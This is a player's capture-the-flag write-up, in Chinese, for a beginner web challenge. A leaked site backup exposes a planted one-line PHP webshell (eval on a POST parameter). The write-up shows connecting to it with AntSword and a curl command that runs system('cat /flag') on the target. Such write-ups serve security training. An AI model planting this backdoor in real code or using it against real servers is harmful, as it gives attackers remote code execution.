# web_antshell —— Web 入门题（备份泄漏 + 一句话木马连接）解题过程

> 玩家视角的第一人称解题记录。

## 0. 入场

打开题目链接，是一个「蚂蚁云 AntCloud - 主机状态监控」页面：三台节点的状态表、
几条巡检事件，顶部一条维护公告——

> 核心节点升级维护中，站点已回滚至备份版本……运维同事请下载**站点备份包**自行核对配置。

robots.txt 里也写了 `Disallow: /backup/`，就算不看公告，目录扫描同样能撞到。

## 1. 备份泄漏

下载 `/backup/antcloud_backup.zip`，解压出四个文件：

```
index.php    状态页（纯展示）
config.php   全局配置
ant.php      可疑
robots.txt
```

config.php 末尾有条不敢见光的 TODO：

```php
// TODO(lihua): 上线前记得删掉 ant.php，
// 老板问起来就说是健康检查接口，千万别说漏嘴
```

后门就是 `ant.php`。打开一看，是最经典的一句话木马：

```php
eval($_POST['ant']);
```

连接密码（POST 参数名）就是 `ant`。

顺带一提：直接浏览器 GET 访问 `/ant.php`，页面会报一句
`Warning: Undefined array key "ant"`——没带 POST 参数，
连接密码（参数名）倒是先在报错里泄露了。这也是 webshell 的经典特征：
GET 访问只见报错，POST 才干活。

## 2. 蚁剑连接

一句话木马不挑管理工具，这里用题面推荐的中国蚁剑。打开蚁剑，右键「添加数据」：

| 配置项 | 值 |
|---|---|
| URL 地址 | `http://<题目地址>/ant.php` |
| 连接密码 | `ant` |
| 连接类型 | PHP |

测试连接，基础信息（路径 / 系统 / 用户）正常返回，连接成功。

## 3. 拿 flag

题面说了 flag 在服务器的文件系统里：

- 虚拟终端：`cat /flag`
- 或文件管理器：进根目录，双击 `flag` 文件

得到 `hctf{...}`。

## 4. 后记

一句话木马本质是「把 POST 参数当代码执行」，所以不装工具手搓请求同样可行：
`curl -d "ant=system('cat /flag');" http://<题目地址>/ant.php`。
writeup 目录里的 exp.py 复现的是蚁剑默认配置下的真实流量结构（明文 PHP 代码包在
固定头部与回显函数之间），不开蚁剑也能完整走一遍利用链。
